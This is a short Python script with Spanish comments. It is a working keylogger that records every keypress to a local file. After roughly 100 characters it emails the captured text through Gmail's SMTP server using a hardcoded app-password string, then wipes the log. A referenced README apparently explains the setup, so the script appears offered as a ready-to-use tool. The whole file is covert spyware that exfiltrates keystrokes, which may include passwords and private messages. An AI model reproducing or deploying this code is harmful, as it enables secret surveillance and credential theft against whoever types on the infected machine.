import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


archivo = open('0.txt', 'w')
cont = 0
carac = 0

while True:
    event = keyboard.read_event()
    if event.name == 'esc':
        break
    elif event.event_type == keyboard.KEY_DOWN:
        if event.name == 'space':
            cont += 1
            event.name = ' '
        if event.name == 'backspace':
            event.name = ' -backspace- '
        if (event.name == 'enter') or (cont == 5):
            with open('0.txt', 'a') as archivo:
                archivo.write(f'\n {event.name}')
            cont = 0
        else:
            with open('0.txt', 'a') as archivo:
                archivo.write(f'{event.name}')

    carac += 1
    if carac >= 100:
        with open('0.txt', 'r') as archivox:
            contenido = archivox.read()

        # Configura los detalles del servidor SMTP (en este caso, el servidor de Gmail)
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587                   # deja esto como esta
        smtp_username = 'mail@gmail.com' # tu mail
        smtp_password = 'gfyfabslhznhjhua' # este es un codigo que NO es tu contraseña de mail, en el READ ME explico de donde sacarlo

        
        subject = 'Resume'
        body = contenido
        sender_email = 'mail@gmail.com'  # tu mail
        recipient_email = 'mail@gmail.com'  # tu mail

        
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        # Establece la conexión con el servidor SMTP
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            # Inicia el modo TLS (Transport Layer Security)
            server.starttls()

            # Inicia sesión en el servidor SMTP
            server.login(smtp_username, smtp_password)

            # Envía el correo electrónico
            server.sendmail(sender_email, recipient_email, message.as_string())

        carac = 0
        archivo.close()
        archivo = open('0.txt', 'w')  # Abre el archivo en modo escritura para limpiar su contenido


archivo.close()
